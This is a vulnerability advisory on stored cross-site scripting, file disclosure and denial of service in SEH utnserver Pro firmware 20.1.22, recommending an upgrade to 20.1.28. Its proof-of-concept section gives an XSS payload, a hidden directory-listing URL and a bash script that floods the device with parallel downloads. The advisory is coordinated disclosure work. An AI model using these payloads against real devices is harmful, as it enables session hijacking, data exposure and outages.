# Multiple Vulnerabilities in SEH untserver Pro

The untserver Pro ist prone to stored cross-site scripting, file disclosure and denial of service attacks. This allows an attacker to deactivate the device or place malicious code in the web interface of the untserver.

## Vendor description

We are SEH from Bielefeld â manufacturer of high-quality network solutions. With over 35 years of experience in the fields of printing and networks, we offer our customers a broad and high-level expertise in solutions for all types of business environments.

### Vulnerable versions

utnserver Pro / 20.1.22

utnserver ProMAX / 20.1.22

INU-100 / 20.1.22

#### Vulnerability overview

1) Stored Cross-Site Scripting (CVE-2024-5420)

A Stored Cross-Site Scripting vulnerability was identified in the web interface of the device. Multiple parameters, e.g. the device description, can be abused to inject JavaScript code. An attacker can exploit this vulnerability by luring a victim to visit a malicious website. Furthermore, it is possible to hijack the session of the attacked user.

2) Authenticated File Disclosure (CVE-2024-5421)

Files and content of directories can be disclosed by integrated functions of the device.

3) Denial of Service (CVE-2024-5422)

A Denial-of-Service vulnerability has been identified in the web interface of the device. This can be triggered by sending a lot of requests that trigger serial interface access on the device.

#### Proof of Concept

##### 1) Stored Cross-Site Scripting (CVE-2024-5420)

By accessing to the following URL, an attacker can modify the device description:

http://$IP/device/description\_en.html

By using malicious JavaScript payload, it is possible to execute arbitrary code. This snippet demonstrates such a payload:

```
â><script>alert(document.location)</script>
```

Saving this text to the device description leads to a persistent cross-site scripting. Therefore, everyone who openes the device description executes the injected code in the context of the own browser.

##### 2) Authenticated File Disclosure (CVE-2024-5421)

A hidden function in the web-interface of the device can be used to disclose directories and files on operating system level. The function can be accessed directly via the browser:

http://$IP/info/dir?/

This lists the current directory and provides the files to be downloaded.

##### 3) Denial of Service (CVE-2024-5422)

For triggering a denial of service on the device, multiple file descriptors are opened by using the following script:

```
#!/bin/bash
echo âParameters: $1 $2â
last_iter=$(($2 â 1))
for ((i=1; i<=$2; i++))
do
echo â[$i] Downloading application binaryâ
if [[ â$iâ == â$last_iterâ ]];then
curl http://$1/info/file?/application âoutput ./file_${i}.txt &> /dev/null
else
curl http://$1/info/file?/application âoutput ./file_${i}.txt &> /dev/null &
fi
done
```

The vulnerabilities were manually tested on an emulated device by using the MEDUSA scalable firmware runtime (https://medusa.cyberdanube.com) and verified on a real device.

#### Solution

Install firmware version 20.1.28 to fix the vulnerabilities.

#### Workaround

None

#### Recommendation

CyberDanube recommends SEH Computertechnik customers to upgrade the firmware to the latest version available.
